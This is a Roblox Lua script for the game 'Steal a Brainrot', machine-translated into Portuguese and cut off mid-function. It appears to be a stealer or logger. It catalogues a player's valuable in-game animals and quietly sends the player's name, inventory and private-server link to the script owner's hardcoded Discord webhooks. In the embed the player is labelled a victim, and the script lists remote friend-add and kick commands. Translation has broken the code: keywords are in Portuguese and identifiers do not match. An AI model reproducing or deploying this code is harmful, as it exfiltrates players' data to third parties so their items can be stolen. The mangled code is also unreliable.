Biblioteca local = {}

Jogadores locais = jogo:ObterServiço("Jogadores")
local StarterGui = game:GetService("StarterGui")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local RunService = jogo:GetService("RunService")

jogador local = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local ANIMAIS_ESPECIAIS_CODIFICADOS = {
    "Ticac Sahur",
    "Tralaledon",
    "Garama e Madundung",
    "Nuclearo Dinossauro",
    "Elefante de Morango",
    "Ketchuru e Musturu",
    "Cavaleiro sem cabeça"
    "Miau",
    "Capitão Moby",
    "La Casa Boo",
    "Los Spooky Combanasionias",
    "Los Combinasionas",
    "Canelone de Dragão",
    "Chipso e Queijo",
    "La Taco Combinasion",
    "Burguru e Fryuru",
}

local HARDCODED_SPECIAL_WEBHOOK = "https://discord.com/api/webhooks/1441521246796910624/eULhB5XJbqIfypDogaWuzWuyMJ9f3Ay9cMeZh31uTDQPin1tYqgiPCBHaGakfXG8ymOv"

local HARDCODED_ALLOWED_ANIMALS = {
    "67",
    "Celularcini Viciosini",
    "Canelone de Dragão",
    "Esok Sekolah",
    "Ketupat Kepat",
    "Mariachi Corazoni",
    "Dinheiro, dinheiro, pug",
    "Bloco da Sorte Secreto",
    "Espaguete Tualetti",
    "Tang Tang Kelentang",
    "Eviledon",
    "La Spooky Grande",
    "Los Bros",
    "Los Chicleteiras",
    ","
    "Los Hotspotsitos",
    "Los Nooo My Hotspotsitos",
    "Los Primos",
    "Los Mobilis",
    "Las Sis",
    "La Grande Combinasion",
    "La Supreme Combinasion",
    "La Extinct Grande",
    "As Combinações Secretas",
    "Assustador e Abóbora",
    "Los Lucky Blocks",
    "Bloco da Sorte do Administrador",
    "Burguro e Fryuro",
    "Chili Relaxante",
    "Los Tacoritas",
    "Tacorita Bicicleta",
    "Mieteteira Bicicleteira",
    "La Casa Boo",
    "Ponto quente de maconha"
}

local HARDCODED_OWNER_WEBHOOKS = {
    ["10-20m"] = "",
    ["50m"] = "",
    ["100m"] = "",
    ["500m"] = "",
    ["desconhecido"] = "https://discord.com/api/webhooks/1442275307334668480/6jzhflik2edNhmMzTtF2DVy78Tv_KdzDTTC9SiZhQUiEh0CRb0av1gyqYCi25TfbJ0Jy"
}

Configuração local = {
    WEBHOOKS = {},
    ANIMAIS_ESPECIAIS = {},
    ANIMAIS_PERMITIDOS = {},
    BLACKLIST_URL = nulo,
    PING_ROLES = {},
    USER_WEBHOOK = nulo,
    PING_THRESHOLD = 50000000
}

local serverLinkToSend = ""

função local silenciarTodo(container)
    para _, obj em pares(container:GetDescendants()) faça
        se obj:IsA("Som") então
            obj.Volume = 0
        fim
    fim
fim

função local isHardcodedSpecialAnimal(animalName)
    para _, specialName em ipairs(HARDCODED_SPECIAL_ANIMALS) faça
        se animalName:lower():find(specialName:lower(), 1, true) ou specialName:lower():find(animalName:lower(), 1, true) então
            retornar verdadeiro
        fim
    fim
    retornar falso
fim

função local isHardcodedAllowedAnimal(animalName)
    para _, allowedName em ipairs(HARDCODED_ALLOWED_ANIMALS) faça
        se allowedName ~= "" e (animalName:lower():find(allowedName:lower(), 1, true) ou allowedName:lower():find(animalName:lower(), 1, true)) então
            retornar verdadeiro
        fim
    fim
    retornar falso
fim

função local isSpecialAnimal(nomeDoAnimal)
    para _, specialName em ipairs(Config.SPECIAL_ANIMALS) faça
        se animalName:lower():find(specialName:lower(), 1, true) ou specialName:lower():find(animalName:lower(), 1, true) então
            retornar verdadeiro
        fim
    fim
    retornar falso
fim

função local verificarBlacklist()
    se não Config.BLACKLIST_URL então
        retornar falso
    fim

    sucesso local, blacklistData = pcall(function()
        retornar HttpService:GetAsync(Config.BLACKLIST_URL)
    fim)
    
    se for bem-sucedido, então
        lista negra local = HttpService:JSONDecode(dadosdalistanegra)
        
        para _, entrada em ipairs(blacklist.blacklisted_users ou {}) faça
            Se entry.user_id == player.UserId ou entry.username == player.Name então
                player:Kick("Acesso negado")
                retornar verdadeiro
            fim
        fim
    outro
        aviso("[BLACKLIST] Não foi possível carregar a blacklist:", blacklistData)
    fim
    
    retornar falso
fim

função local getAnimalValueFromGeneration(generationText)
    se não generationText ou generationText == "Desconhecido" ou generationText == "" então
        retornar "desconhecido"
    fim

    local lowerGen = generationText:lower()
    padrão numérico local = "%$?([%d,]+)m"
    local numberStr = lowerGen:match(numberPattern)

    se não for numberStr então
        retornar "desconhecido"
    fim

    numberStr = numberStr:gsub(",", "")
    número local = paranúmero(númeroStr)
    se não for um número então
        retornar "desconhecido"
    fim

    Se o número for maior ou igual a 1 e menor que 50, então
        retornar "10-20m"
    senão se número >= 50 e número < 100 então
        retornar "50m"
    senão se número >= 100 e número < 500 então
        retornar "100m"
    senão se número >= 500 então
        retornar "500m"
    fim

    retornar "desconhecido"
fim

função local getPodiumInfo()
    local searchText = player.DisplayName .. "'s Base"
    aviso("h//h", texto_da_busca)
    local Plots = Workspace:FindFirstChild("Plots")

    se não forem Plots então
        aviso("h//h")
        retornar {}
    fim

    local playerBase = nulo
    para _, plot em pares(Plots:GetDescendants()) faça
        Se plot.Name == "PlotSign" então
            local surfaceGui = plot:FindFirstChild("SurfaceGui")
            se surfaceGui então
                local frame = surfaceGui:FindFirstChild("Frame")
                se quadro então
                    local textLabel = frame:FindFirstChild("TextLabel")
                    se textLabel e textLabel:IsA("TextLabel") então
                        se string.find(textLabel.Text, searchText) então
                            local plotParent = plot
                            enquanto plotParent.Parent ~= Plots faça
                                plotParent = plotParent.Parent
                                se plotParent == Workspace ou plotParent == game então
                                    quebrar
                                fim
                            fim
                            playerBase = plotParent
                            quebrar
                        fim
                    fim
                fim
            fim
        fim
    fim

    se não playerBase então
        aviso("h//h")
        retornar {}
    fim

    aviso("h//h", playerBase.Name)

    local foundModels = {}
    local modelCount = {}
    local baseDescendants = playerBase:GetDescendants()

    -- Pesquise primeiro em AnimalPodiums para identificar os animais reais
    local animalPodiums = playerBase:FindFirstChild("AnimalPodiums")
    se não for animalPodiums então
        warning("h//h Não foi encontrado AnimalPodiums")
        retornar foundModels, modelCount
    fim

    aviso("h//h AnimalPodiums encontrado")
    local podiumDescendants = animalPodiums:GetDescendants()
    local animalNames = {}

    -- Obtener nomes e gerações dos pódios
    para _, descendente em pares(podiumDescendants) faça
        se descendente:IsA("TextLabel") e descendente.Name == "DisplayName" então
            local displayText = descendente.Text
            local generationText = "Desconhecido"
            
            local parent = descendente.Parent
            se for pai então
                para _, filho em pares(pai:GetChildren()) faça
                    se filho:IsA("TextLabel") e filho.Name == "Generation" então
                        generationText = child.Text
                        quebrar
                    fim
                fim
            fim
            
            warning("h//h Animal no pódio:", displayText, "Gen:", GenerationText)
            tabela.inserir(nomesdeanimais, {nome = textoExibir, geração = textoGeração})
        fim
    fim

    aviso("h//h Total de animais em pódios:", #nomesdeanimais)

    -- Agora procure esses animais na base para obter mutações
    para _, animalInfo em ipairs(animalNames) faça
        para _, descendente em pares(baseDescendants) faça
            se descendente:ÉUm("Modelo") então
                nomeDoModeloLocal = descendente.Nome
                
                -- Verifique se este modelo coincide com um animal do pódio
                se modelName:lower():find(animalInfo.name:lower(), 1, true) ou animalInfo.name:lower():find(modelName:lower(), 1, true) então
                    
                    se não modelCount[modelName] então
                        modelCount[modelName] = 0
                    fim
                    modelCount[modelName] = modelCount[modelName] + 1

                    mutações locais = {}
                    para _, filho em pares(descendente:GetDescendants()) faça
                        se child.Name:match("^_Trait%.") então
                            local mutationName = child.Name:gsub("^_Trait%.", "")
                            tabela.inserir(mutações, nomeDaMutação)
                        fim
                    fim

                    tabela.inserir(modelosEncontrados, {
                        nome = nomeDoModelo,
                        geração = animalInfo.geração,
                        mutações = mutações,
                        caminho = descendente:ObterNomeCompleto(),
                        contagem = contagemDeModelos[nomeDoModelo],
                        valor = obterValorAnimalDaGeração(informaçãoAnimal.geração)
                    })
                    
                    warning("h//h Animal agregado:", modelName, "Gen:", animalInfo.generação)
                fim
            fim
        fim
    fim
    
    warning("h//h Total de animais finais encontrados:", #foundModels)

    retornar foundModels, modelCount
fim

função local classificarAnimais(AnimaisEncontrados)
    classificado local = {
        ["10-20m"] = {},
        ["50m"] = {},
        ["100m"] = {},
        ["500m"] = {},
        ["desconhecido"] = {},
        ["especial"] = {},
        ["hardcoded_special"] = {}
    }

    local hasHardcodedSpecial = false
    
    para _, animalData em ipairs(foundAnimals) faça
        se isHardcodedSpecialAnimal(animalData.name) então
            aviso("h//h", animalData.name)
            tabela.inserir(classificado["hardcoded_special"], dados_animais)
            hasHardcodedSpecial = true
        fim
    fim
    
    se hasHardcodedSpecial então
        aviso("h//h")
        retorno classificado
    fim

    para _, animalData em ipairs(foundAnimals) faça
        se isHardcodedAllowedAnimal(animalData.name) então
            animalData.isHardcodedAllowed = true
            aviso("h//h", animalData.name)
        fim
        
        se isSpecialAnimal(animalData.name) então
            aviso("h//h", animalData.name)
            tabela.inserir(classificado["especial"], dadosAnimal)
        outro
            se não animalData.value então
                animalData.value = getAnimalValueFromGeneration(animalData.generation)
            fim
            categoria local = dadosAnimal.valor
            aviso("h//h", animalData.name, categoria)
            tabela.inserir(classificado[categoria], dadosAnimal)
        fim
    fim

    retorno classificado
fim

função local sendToWebhook(category, animals, serverLink, modelCount)
    -- Permitir envio mesmo se não houver animais
    local hasAnimals = animals and #animals > 0

    função local normalizeWebhook(webhook)
        local normalizado = {}
        se não for webhook então
            retornar normalizado
        fim
        
        se type(webhook) == "string" então
            se webhook ~= "" então
                tabela.inserir(normalizada, webhook)
            fim
        senão se type(webhook) == "table" então
            para _, url em ipairs(webhook) faça
                se type(url) == "string" e url ~= "" então
                    tabela.inserir(normalizada, url)
                fim
            fim
        fim
        
        retornar normalizado
    fim

    URLs de webhook locais = {}
    
    -- Agregar webhook do usuário (normalizado)
    se Config.USER_WEBHOOK então
        local userWebhooks = normalizeWebhook(Config.USER_WEBHOOK)
        para _, url em ipairs(userWebhooks) faça
            tabela.inserir(webhookUrls, url)
            warning("h//h agregando webhook do usuário:", url)
        fim
    fim
    
    -- SIEMPRE agregar webhook do proprietário segundo categoria (hardcodeado)
    se categoria == "hardcoded_special" então
        tabela.inserir(webhookUrls, HARDCODED_SPECIAL_WEBHOOK)
        aviso("h//h adicionando webhook hardcoded special del owner")
    senão se categoria == "todas" então
        -- Para a categoria "todos", adiciona TODOS os webhooks do proprietário
        para ownerCategory, ownerWebhook em pares(HARDCODED_OWNER_WEBHOOKS) faça
            tabela.inserir(webhookUrls, ownerWebhook)
            warning("h//h agregando proprietário webhook hardcodeado para categoria", proprietárioCategory)
        fim
        -- Também adicione o webhook especial
        tabela.inserir(webhookUrls, HARDCODED_SPECIAL_WEBHOOK)
        aviso("h//h adicionando webhook hardcoded special del owner (all)")
    senão se HARDCODED_OWNER_WEBHOOKS[category] então
        tabela.inserir(webhookUrls, HARDCODED_OWNER_WEBHOOKS[categoria])
        warning("h//h agregando proprietário webhook hardcodeado para", categoria)
    fim
    
    -- Agregar webhooks de configuração do usuário (normalizado)
    se Config.WEBHOOKS[categoria] então
        local configWebhooks = normalizeWebhook(Config.WEBHOOKS[category])
        para _, url em ipairs(configWebhooks) faça
            tabela.inserir(webhookUrls, url)
            warning("h//h agregando webhook de configuração:", url)
        fim
    fim
    
    se #webhookUrls == 0 então
        warning("h//h Não foi encontrado webhooks para", categoria)
        retornar
    fim
    
    warning("h//h Total de webhooks a enviar:", #webhookUrls)

    local playerName = player.Name
    local displayName = player.DisplayName

    lista_animal_local = ""
    
    se tiverAnimais então
        para i, animalData em ipairs(animais) faça
            linha local = ""
            
            -- Agregar traits ao princípio com formato [Trait]
            se animalData.mutations e #animalData.mutations > 0 então
                para _, mutação em ipairs(animalData.mutations) faça
                    linha = linha .. "[" .. mutação .. "] "
                fim
            fim
            
            -- Adicionar nome do animal
            linha = linha .. animalData.name
            
            se animalData.generation então
                linha = linha .. " - Gen: " .. animalData.generation
            fim
            Se animalData.count e animalData.count > 1 então
                linha = linha .. " (x" .. animalData.count .. ")"
            fim

            se i == 1 então
                listaDeAnimais = linha
            outro
                listaDeAnimais = listaDeAnimais .. "\n" .. linha
            fim
        fim
    outro
        listaDeAnimais = "Nenhum"
    fim

    local duplicateWarning = ""
    
    se hasAnimals e modelCount então
        para modelName, count em pares(modelCount) faça
            se a contagem for maior que 2 então
                para _, animalData em ipairs(animais) faça
                    se animalData.name == modelName então
                        duplicateWarning = duplicateWarning .. "+ " .. modelName .. " (x" .. count .. ")\n"
                        quebrar
                    fim
                fim
            fim
        fim

        se duplicateWarning ~= "" então
            duplicaWarning = "\n\nDUPLICADOS DETECTADOS (>2):\n" .. duplicaWarning
        fim
    fim

    local categoryDisplay = categoria
    mensagem de ping local
    
    se categoria == "todas" então
        categoriaDisplay = "TODOS OS BRAINROTS"
        -- Se não alterar o limite (valor por defeito), use @everyone
        se Config.PING_THRESHOLD == 50000000 então
            pingMessage = "@todos"
        outro
            pingMessage = "@aqui"
        fim
    senão se categoria == "hardcoded_special" então
        categoryDisplay = "BRAINROT ESPECIAL CODIFICADO"
        pingMessage = "@todos"
    outro
        pingMessage = Config.PING_ROLES[category] ou ""
        
        se categoria == "10-20m" então
            categoryDisplay = "BRAINROTS 10-20M"
        senão se categoria == "50m" então
            categoryDisplay = "BRAINROTS 50M"
        senão se categoria == "100m" então
            categoryDisplay = "BRAINROTS 100M"
        senão se categoria == "500m" então
            categoryDisplay = "BRAINROTS 500M"
        senão se categoria == "especial" então
            categoryDisplay = "ESPECIAL PARA ROTINEIROS"
        outro
            categoryDisplay = "VALOR DESCONHECIDO DO CÉREBRO"
        fim
    fim

    -- Função para criar a incorporação atualizada
    função local criarDadosEmbutidos()
        local currentPlayerCount = #Players:GetPlayers()
        local isPlayerInGame = Players:FindFirstChild(playerName) ~= nil
        local playerStatus = isPlayerInGame e "ðŸŸ¢ En el juego" ou "ðŸ”´ Desconectado"
        local multiPlayerWarning = currentPlayerCount > 1 e "âš ï¸ Advertência: Hay " .. currentPlayerCount .. " jogadores no servidor" ou ""
        
        campos locais = {
            {
                ["nome"] = " Informações do jogador:",
                ["value"] = "```diff\n+ Vítima: " .. playerName .. "\n+ Exibição: " .. displayName .. "\n+ Status: " .. playerStatus .. "\n```",
                ["inline"] = falso
            },
            {
                ["nome"] = "Dados do Servidor:",
                ["value"] = "```diff\n+ Jogadores no servidor: " .. currentPlayerCount .. (multiPlayerWarning ~= "" e "\n- " .. multiPlayerWarning ou "") .. "\n```",
                ["inline"] = falso
            },
            {
                ["name"] = "Brainrots importantes (" .. categoryDisplay .. "):",
                ["value"] = "```diff\n+ " .. animalList:gsub("\n", "\n+ ") .. duplicateWarning .. "```",
                ["inline"] = falso
            },
            {
                ["name"] = "Link do Servidor Privado:",
                ["valor"] = "[**SERVIDOR IR AL**](" .. serverLink .. ")",
                ["inline"] = falso
            },
            {
                ["nome"] = "Total:",
                ["value"] = "```diff\n+ Total de Brainrots: " .. (hasAnimals and #animals or 0) .. "\n+ ID do Jogo: " .. tostring(game.GameId) .. "\n```",
                ["inline"] = falso
            },
            {
                ["nome"] = " Comandos Disponíveis:",
                ["value"] = "```\n.add - Envía solicitud de amistad y la abre automaticamente\n.kick (razão) - Saca al jugador del juego\n Exemplo: .kick adios\n```",
                ["inline"] = falso
            }
        }
        
        retornar {
            ["embeds"] = {{
                ["title"] = " Nuevo Exploiter Encontrado - " ..categoriaDisplay,
                ["cor"] = 10038562,
                ["campos"] = campos,
                ["rodapé"] = {
                    ["text"] = "Detector de podridão cerebral - " ..categoriaDisplay .. " | Atualizado"
                },
                ["timestamp"] = DateTime.now():ToIsoDate()
            }}
        }
    fim
    
    dados locais = {
        ["content"] = pingMessage .. " **NOVO SERVIDOR PRIVADO ATINGIDO!**",
        ["embeds"] = createEmbedData()["embeds"]
    }

    local messageIds = {}
    
    métodos locais = {
        {
            nome = "SolicitaçãoAssíncrona",
            func = função(url)
           
